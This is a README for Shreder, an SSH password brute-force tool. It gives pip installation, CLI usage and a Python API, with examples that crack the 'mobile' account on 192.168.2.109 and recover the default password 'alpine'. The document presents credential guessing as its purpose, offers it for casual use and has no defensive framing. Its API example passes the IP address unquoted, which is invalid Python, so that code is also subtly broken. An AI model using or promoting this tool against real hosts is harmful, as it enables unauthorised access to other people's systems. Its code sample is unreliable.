# Shreder

Shreder is a powerful multi-threaded SSH protocol password bruteforce tool.

## Features

* Very fast password guessing, just one password in `0.1` second.
* Optimized for big password lists, Shreder tries 1000 passwords in `1` minute and `40` seconds.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/Shreder
```

## Basic usage

To use Shreder just type `shreder` in your terminal.

```
usage: shreder [-h] [-p PORT] [-u USERNAME] [-l LIST] target

Shreder is a powerful multi-threaded SSH protocol password bruteforce tool.

positional arguments:
  target

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  SSH port.
  -u USERNAME, --username USERNAME
                        SSH username.
  -l LIST, --list LIST  Passwords list.
```

### Examples

Let's bruteforce my device just for fun.

```shell
shreder 192.168.2.109 -u mobile -l passwords.txt
```

**output:**

```shell
[*] Processing... \ | Passwords tried: 8/8
[*] Cooling down after process...
[+] Password has been found!
[i] Password: alpine
[i] Time elapsed: 1.0647449493408203
```

## Shreder API

Shreder also has their own Python API that can be invoked by importing Shreder to your code:

```python
from shreder import Shreder
```

### Basic functions

There are all Shreder basic functions that can be used to bruteforce specified device.

* `connect(host, port, username, password)` - Connect specified defice by network address.
* `brute(host, port, username, list)` - Bruteforce device with list of passwords.

### Examples

```python
from shreder import Shreder

shreder = Shreder()

password = shreder.brute(192.168.2.109, 22, 'mobile', 'passwords.txt')
print(f"Password: {password}")
```

**output:**

```shell
[*] Processing... \ | Passwords tried: 8/8
[*] Cooling down after process...
Password: alpine
```
